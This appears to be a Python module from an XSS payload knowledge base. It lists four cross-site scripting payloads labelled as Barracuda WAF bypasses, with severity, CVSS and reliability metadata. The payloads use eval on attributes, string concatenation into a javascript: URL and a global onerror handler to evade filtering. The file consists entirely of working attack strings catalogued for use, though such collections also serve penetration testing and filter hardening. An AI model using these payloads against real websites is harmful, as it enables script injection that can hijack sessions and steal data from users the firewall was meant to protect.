#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Barracuda WAF Bypass Payloads
"""

from ..models import PayloadEntry


BARRACUDA_BYPASS_PAYLOADS = {
    "barracuda_1": PayloadEntry(
        payload="<img src=x:alert onerror=eval(src)>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Eval src attribute",
        tags=["barracuda", "waf-bypass", "eval"],
        waf_evasion=True,
        bypasses=["barracuda"],
        reliability="medium",
    ),
    "barracuda_2": PayloadEntry(
        payload="<img src=x onerror=eval(name) name=alert(1)>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Eval name attribute",
        tags=["barracuda", "waf-bypass", "eval", "name"],
        waf_evasion=True,
        bypasses=["barracuda"],
        reliability="medium",
    ),
    "barracuda_3": PayloadEntry(
        payload="<svg onload=location=`javas`+`cript:ale`+`rt(1)`>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Template literal concat bypass",
        tags=["barracuda", "waf-bypass", "concat"],
        waf_evasion=True,
        bypasses=["barracuda"],
        reliability="high",
    ),
    "barracuda_4": PayloadEntry(
        payload="<script>onerror=alert;throw 1</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="onerror global handler",
        tags=["barracuda", "waf-bypass", "onerror", "throw"],
        waf_evasion=True,
        bypasses=["barracuda"],
        reliability="high",
    ),
}

BARRACUDA_BYPASS_PAYLOADS_TOTAL = len(BARRACUDA_BYPASS_PAYLOADS)
